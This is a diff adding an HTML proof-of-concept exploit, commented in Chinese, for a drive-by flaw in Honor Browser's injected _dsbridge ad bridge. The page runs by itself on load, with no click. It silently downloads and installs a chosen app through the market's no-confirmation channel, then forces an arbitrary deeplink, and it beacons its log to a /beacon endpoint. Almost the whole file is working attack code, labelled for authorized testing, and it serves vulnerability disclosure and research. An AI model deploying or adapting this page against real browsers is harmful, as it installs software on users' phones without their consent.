@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<!--
+  ============================================================================
+  荣耀浏览器 _dsbridge 静默安装漏洞 —— 自动化 PoC（仅限授权安全测试）
+  ============================================================================
+  原理：荣耀浏览器把广告 SDK 的 _dsbridge 注入每一个浏览 Tab。
+  本页面加载后无需任何点击，自动：
+    1) 探测 _dsbridge 是否存在；
+    2) 调用 callType=download（pkgType=2 荣耀市场免确认通道），
+       静默下载并安装 appPackage 指定的应用；
+    3) 通过 receiveDownloadStatus 回调实时展示 下载/安装 状态机
+       （2003 开始 → 2004 下载中 → 2005 下载完成 → 2011 安装中 → 2012 安装成功）；
+    4) 安装成功后（launch=1 时）自动演示 deeplink 链路：强制浏览器打开标记 URL，
+       证明"任意 deeplink 拉起"原语（目标包名/URI 可任意替换）。
+
+  URL 参数（均可选）：
+    ?pkg=com.netease.cloudmusic   要静默安装的包名（须为荣耀市场在架应用）
+    &launch=0                     设为 0 关闭第 4 步 deeplink 演示（默认开）
+    &marker=http://...            deeplink 演示打开的标记 URL（默认页面同源 /pwned.html）
+  ============================================================================
+-->
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Honor Browser _dsbridge Drive-by Install PoC</title>
+<style>
+  body{font-family:system-ui,monospace;margin:16px;background:#111;color:#eee}
+  h1{font-size:18px;color:#ff5555}
+  .card{background:#1c1c1c;border:1px solid #333;border-radius:8px;padding:12px;margin:10px 0}
+  #status{font-size:22px;font-weight:bold;color:#ffcc00}
+  #status.ok{color:#33dd66}
+  #log{font-size:12px;white-space:pre-wrap;color:#9fd;max-height:50vh;overflow:auto}
+  .dim{color:#888;font-size:12px}
+</style>
+</head>
+<body>
+<h1>荣耀浏览器 _dsbridge 静默安装 PoC（授权测试专用）</h1>
+<div class="card">目标包名：<b id="pkgView">-</b><br>当前状态：<span id="status">初始化…</span></div>
+<div class="card"><div id="log"></div></div>
+<div class="dim">本页面加载后自动执行，无需任何点击。测试完成后请卸载被安装的应用。</div>
+
+<script>
+(function(){
+  var q       = new URLSearchParams(location.search);
+  var PKG     = q.get('pkg')    || 'com.netease.cloudmusic'; // 荣耀市场在架应用，攻击者可换成自己上架的应用
+  var LAUNCH  = q.get('launch') !== '0';
+  var MARKER  = q.get('marker') || (location.origin + '/pwned.html');
+  var ADID    = 'poc-' + Math.random().toString(36).slice(2, 8);
+
+  var pkgView = document.getElementById('pkgView');
+  var statusV = document.getElementById('status');
+  var logV    = document.getElementById('log');
+  pkgView.textContent = PKG;
+
+  var STATUS_TEXT = {
+    2003:'开始下载', 2004:'下载中', 2005:'下载完成', 2006:'下载失败',
+    2007:'等待下载', 2008:'已取消', 2009:'暂停', 2011:'安装中', 2012:'安装成功', 2013:'安装失败'
+  };
+
+  function ts(){ return new Date().toISOString().substr(11, 8); }
+  function log(m){
+    logV.textContent += '[' + ts() + '] ' + m + '\n';
+    // 可选外带信道：若服务端实现了 /beacon 则记录，没有也不影响
+    try { fetch('/beacon?d=' + encodeURIComponent(m)).catch(function(){}); } catch(e){}
+  }
+  function setStatus(s, ok){
+    statusV.textContent = s;
+    if (ok) statusV.className = 'ok';
+  }
+
+  // DSBridge 异步回调（原生通过 _dscbstub 回传结果与下载状态推送）
+  window.__cb = function(d){
+    log('CB <= ' + JSON.stringify(d));
+    try {
+      var info = d && d.data && d.data.adDiInfo;
+      if (info) {
+        var st = info.downStatus;
+        setStatus(STATUS_TEXT[st] || ('状态 ' + st), st === 2012);
+        if (st === 2012) onInstallSuccess(info.appPackage || PKG);
+        if (st === 2006 || st === 2013) setStatus((STATUS_TEXT[st]) + '（请查看 logcat: HiAds）');
+      }
+    } catch(e){ log('cb err: ' + e); }
+  };
+
+  function callNative(payload){
+    var env = {_dscbstub: '__cb', data: payload};
+    return _dsbridge.call('invoke', JSON.stringify(env));
+  }
+
+  // 第 2 原语：任意 deeplink 拉起（VIEW + setPackage，无白名单）
+  function fireDeeplinkDemo(){
+    log('>> 演示 deeplink 链路：强制浏览器打开 ' + MARKER);
+    callNative({callType:'deeplink', data:{baseAdInfo:{
+      promotionPurpose: 2,
+      deeplinkUrl: MARKER,
+      appPackage: 'com.honor.browser',
+      dpPackageName: 'com.honor.browser',
+      landingPageUrl: location.origin + '/lp.html',
+      adRequestId: ADID + '-dl', adId: 'a', adUnitId: 'u'
+    }}});
+  }
+
+  function onInstallSuccess(pkg){
+    log('>> 安装成功: ' + pkg + '（installer 应为 com.hihonor.appmarket）');
+    if (LAUNCH) fireDeeplinkDemo();
+  }
+
+  function main(){
+    if (typeof _dsbridge === 'undefined') {
+      setStatus('失败：当前 WebView 无 _dsbridge（非目标浏览器/版本？）');
+      log('typeof _dsbridge = undefined，桥不存在');
+      return;
+    }
+    log('_dsbridge 存在，开始静默安装 ' + PKG + ' (adUniqueId 前缀 ' + ADID + ')');
+    setStatus('已触发静默下载安装…');
+    var ret = callNative({callType:'download', data:{baseAdInfo:{
+      promotionPurpose: 0,
+      pkgType: 2,                 // 2 = 荣耀市场包：走应用市场免确认安装通道
+      appPackage: PKG,
+      appName: 'PoCApp',
+      landingPageUrl: location.origin + '/lp.html',
+      adRequestId: ADID, adId: 'a', adUnitId: 'u'
+    }}});
+    log('同步返回: ' + JSON.stringify(ret) + '（code:-1 表示异步处理中，属正常）');
+  }
+
+  window.addEventListener('load', function(){ setTimeout(main, 300); });
+})();
+</script>
+</body>
+</html>
